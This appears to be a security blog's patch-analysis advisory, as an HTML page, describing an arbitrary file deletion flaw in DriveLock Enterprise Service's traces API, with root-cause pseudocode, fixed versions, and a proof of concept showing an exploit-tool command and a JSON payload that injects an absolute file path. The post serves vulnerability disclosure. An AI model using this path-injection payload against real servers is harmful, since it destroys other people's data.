@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Delete arbitrary files | Red vs. Blue Shell</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Delete arbitrary files" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Product description The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside. This means you are secure at the centre, with all paths of access to your sensitive data blocked." />
+<meta property="og:description" content="Product description The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside. This means you are secure at the centre, with all paths of access to your sensitive data blocked." />
+<link rel="canonical" href="/patch%20analysis/2026/03/01/dl-DES-arbitrary-delete.html" />
+<meta property="og:url" content="/patch%20analysis/2026/03/01/dl-DES-arbitrary-delete.html" />
+<meta property="og:site_name" content="Red vs. Blue Shell" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-03-01T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Delete arbitrary files" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-03-01T00:00:00+00:00","datePublished":"2026-03-01T00:00:00+00:00","description":"Product description The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside. This means you are secure at the centre, with all paths of access to your sensitive data blocked.","headline":"[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Delete arbitrary files","mainEntityOfPage":{"@type":"WebPage","@id":"/patch%20analysis/2026/03/01/dl-DES-arbitrary-delete.html"},"url":"/patch%20analysis/2026/03/01/dl-DES-arbitrary-delete.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link id="main-stylesheet" rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Red vs. Blue Shell" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Red vs. Blue Shell</a>
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon"></span>
+        </label>
+
+        <div class="nav-items">
+  <a class="nav-item" href="/about/">About</a>
+</div>
+
+      </nav>
+  </div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Delete arbitrary files</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2026-03-01T00:00:00+00:00" itemprop="datePublished">Mar 1, 2026
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody"><p class="advisory-details">
+
+<table>
+    <tr>
+        <th>Product:</th>
+        <th>DriveLock</th>
+    </tr>
+    <tr>
+        <th>Homepage:</th>
+        <th><a href="https://www.drivelock.com/">https://www.drivelock.com/</a></th>
+    </tr>
+
+
+    <tr>
+        <th>CVE Number:</th>
+        <th><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=ToDo">ToDo</a></th>
+    </tr>
+
+
+    
+    <tr>
+        <th>Vulnerable version:</th>
+        <th>< 25.2.4, < 25.1.7, < 24.2.9</th>
+    </tr>
+    <tr>
+        <th>Fixed version:</th>
+        <th>25.2.4, 25.1.7, 24.2.9</th>
+    </tr>
+    <tr>
+        <th>CVSS Score:</th>
+        <th><span class="HIGH">HIGH 6.5</span> - <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H">CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H</a>
+        </th>
+    </tr>
+    <tr>
+        <th>Found:</th><th>Feb 27, 2026</th>
+    </tr>
+</table>
+
+</p>
+
+Back to: <a href="/advisory/2026/03/02/drivelock-patch-analysis.html">[PatchAnalysis - DriveLock] DriveLock Enterprise Service 25.2.4 hidden vulnerabilites </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h1 id="product-description">Product description</h1>
+<blockquote>
+  <p>The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
+This means you are secure at the centre, with all paths of access to your sensitive data blocked.</p>
+</blockquote>
+
+<p><em>Cite: <a href="https://www.drivelock.com/en/">DriveLock - Homepage</a></em></p>
+
+<p>This platform includes the <code class="language-plaintext highlighter-rouge">DriveLock Core</code> component, which is an agent installed on the client machines.</p>
+
+<h2 id="overview--impact">Overview / Impact</h2>
+<p>An attacker can force the <code class="language-plaintext highlighter-rouge">DES</code> to delete arbitrary files on the filesystem, by using the <code class="language-plaintext highlighter-rouge">traces</code> API endpoint.</p>
+
+<p><strong>Privileges Required</strong></p>
+<ul>
+  <li>User required: <code class="language-plaintext highlighter-rouge">true</code></li>
+  <li>Permission: <code class="language-plaintext highlighter-rouge">PermissionType.TraceFiles_Write</code></li>
+</ul>
+
+<h1 id="root-cause-analysis">Root Cause Analysis</h1>
+<p>The implementation of the <code class="language-plaintext highlighter-rouge">delete traces</code> endpoint <code class="language-plaintext highlighter-rouge">/api/administration/traceFiles/traces</code> uses the user provided data without sanitizing / validating it.
+The value <code class="language-plaintext highlighter-rouge">request.TraceFiles[].name</code> is passed to the <code class="language-plaintext highlighter-rouge">Path.Combine</code> function to build the full path for the file which should be deleted. After building the path it is used in <code class="language-plaintext highlighter-rouge">System.IO.File.Delete</code> without further validation.</p>
+
+<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// FILE: EnterpriseServer.Administration/EnterpriseServer.Administration.Controller/TraceFilesController.cs</span>
+
+<span class="n">FUNCTION</span> <span class="nf">DeleteTraceFiles</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+
+    <span class="c1">// 1. Check permissions</span>
+    <span class="nf">EnsureUserHasPermission</span><span class="p">(</span><span class="s">"TraceFiles_Write"</span><span class="p">,</span> <span class="s">"Delete TraceFiles"</span><span class="p">)</span>
+    <span class="c1">// 2. Validate input</span>
+    <span class="n">IF</span> <span class="n">request</span> <span class="n">IS</span> <span class="n">NULL</span> <span class="n">OR</span> <span class="n">request</span><span class="p">.</span><span class="n">TraceFiles</span> <span class="n">IS</span> <span class="n">NULL</span> <span class="n">THEN</span>
+        <span class="n">RETURN</span> <span class="nf">BadRequest</span><span class="p">(</span><span class="s">"No traces given"</span><span class="p">)</span>
+    <span class="n">END</span> <span class="n">IF</span>
+    <span class="c1">// 3. Process each trace file</span>
+    <span class="n">FOR</span> <span class="n">EACH</span> <span class="n">traceFile</span> <span class="n">IN</span> <span class="n">request</span><span class="p">.</span><span class="n">TraceFiles</span> <span class="n">DO</span>
+        <span class="n">basePath</span> <span class="p">=</span> <span class="nf">GetPathForLocalTraces</span><span class="p">(</span>
+                        <span class="nf">CurrentTenantFromToken</span><span class="p">(),</span>
+                        <span class="n">traceFile</span><span class="p">.</span><span class="n">Computer</span>
+                    <span class="p">)</span>
+        <span class="n">fullPath</span> <span class="p">=</span> <span class="nf">CombinePath</span><span class="p">(</span><span class="n">basePath</span><span class="p">,</span> <span class="n">traceFile</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span>
+
+        <span class="n">IF</span> <span class="nf">FileExists</span><span class="p">(</span><span class="n">fullPath</span><span class="p">)</span> <span class="n">THEN</span>
+            <span class="nf">DeleteFile</span><span class="p">(</span><span class="n">fullPath</span><span class="p">)</span>
+        <span class="n">END</span> <span class="n">IF</span>
+    <span class="n">END</span> <span class="n">FOR</span>
+    <span class="c1">// 4. Return success</span>
+    <span class="n">RETURN</span> <span class="nf">Ok</span><span class="p">()</span>
+
+<span class="n">END</span> <span class="n">FUNCTION</span>
+</code></pre></div></div>
+
+<h1 id="proof-of-concept--exploit">Proof of Concept / Exploit</h1>
+<p>Setup <code class="language-plaintext highlighter-rouge">JWT</code> environment var and run the included <a href="/assets/drivelock/poc/poc-arbitrary-delete.sh">PoC - arbitrary-delete</a>:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">export </span><span class="nv">JWT</span><span class="o">=</span><span class="s2">"XXX"</span>
+❯ ./poc-arbitrary-delete.sh
+</code></pre></div></div>
+
+<h2 id="exploit">Exploit</h2>
+<p>The following demonstrates the usage of the exploit suite.</p>
+
+<p>Pre-setup: create a file which can be deleted by the configured <code class="language-plaintext highlighter-rouge">DES</code> service user - eg. <code class="language-plaintext highlighter-rouge">drivelock.svc</code>.</p>
+<pre><code class="language-ps1">PS C:\temp&gt; New-Item foobar.txt
+    Directory: C:\temp
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        12/3/2025   9:33 AM              0 foobar.txt
+
+
+PS C:\temp&gt; icacls "foobar.txt" /grant "Users:(F)" /T
+processed file: foobar.txt
+Successfully processed 1 files; Failed processing 0 files
+PS C:\temp&gt; ls
+    Directory: C:\temp
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        12/3/2025   9:33 AM              0 foobar.txt
+-a----        11/3/2025   8:54 PM     1426724864 SQLServer2019-x64-ENU-Dev.iso
+-a----        11/3/2025   9:11 PM      495847104 SSMS-Setup-ENU.exe
+
+</code></pre>
+
+<p>Running the exploit:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ uv run <span class="nt">-m</span> drivelock.exploit <span class="nt">--tenant</span> doetess <span class="nt">-u</span> stuxxn <span class="nt">-P</span> <span class="s1">'!23456Qwertz'</span> deleteFile <span class="s1">'C:\\temp\\foobar.txt'</span>
+<span class="o">[</span>INFO] URL: https://192.168.60.10:4568/api/administration/auth/login
+<span class="o">[</span>INFO] Login as - tenant: doetess, user: stuxxn
+<span class="o">[</span>INFO] Setup JWT <span class="k">for </span>http.client
+<span class="o">[</span>DEBUG] Token: XXX
+<span class="o">[</span>INFO] URL: https://192.168.60.10:4568/api/administration/traceFiles/traces
+<span class="o">[</span>INFO] Payload: <span class="o">{</span><span class="s1">'TraceFiles'</span>: <span class="o">[{</span><span class="s1">'computer'</span>: <span class="s1">''</span>, <span class="s1">'name'</span>: <span class="s1">'C:\\temp\\foobar.txt'</span><span class="o">}]}</span>
+</code></pre></div></div>
+
+<pre><code class="language-ps1">PS C:\temp&gt; # After running the exploit
+PS C:\temp&gt; ls
+    Directory: C:\temp
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        11/3/2025   8:54 PM     1426724864 SQLServer2019-x64-ENU-Dev.iso
+-a----        11/3/2025   9:11 PM      495847104 SSMS-Setup-ENU.exe
+</code></pre>
+
+<h1 id="solution">Solution</h1>
+<p>Patch for version 25.2, 25.1 and 24.2 were published on 2026-02-20, which fixes the vulnerability.
+Patched versions:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>25.2.4
+25.1.7
+24.2.9
+</code></pre></div></div>
+
+<p>No other mitigations are known.</p>
+
+
+  </div>
+
+  <a class="u-url" href="/patch%20analysis/2026/03/01/dl-DES-arbitrary-delete.html" hidden></a>
+</article>
+
+      </div>
+    </main><link id="fa-stylesheet" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.0.0/css/all.min.css">
+
+<footer class="site-footer h-card">
+  <data class="u-url" value="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+      </div>
+      <div class="footer-col">
+        <p>Posts about IT Security, pentesting and bug bounty hunting.</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+    <a rel="me" href="" target="_blank" title="">
+      <span class="grey fa-brands fa- fa-lg"></span>
+    </a>
+  </li><li>
+    <a rel="me" href="" target="_blank" title="">
+      <span class="grey fa-brands fa- fa-lg"></span>
+    </a>
+  </li>
+  <li>
+    <a href="/feed.xml" target="_blank" title="Subscribe to syndication feed">
+      <svg class="svg-icon grey" viewbox="0 0 16 16">
+        <path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194
+          11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.99 2.194-2.2 2.194C.98 16 0 15.017 0
+          13.806c0-1.21.983-2.195 2.194-2.195zM10.606
+          16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"
+        />
+      </svg>
+    </a>
+  </li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+
+</body>
+
+</html>
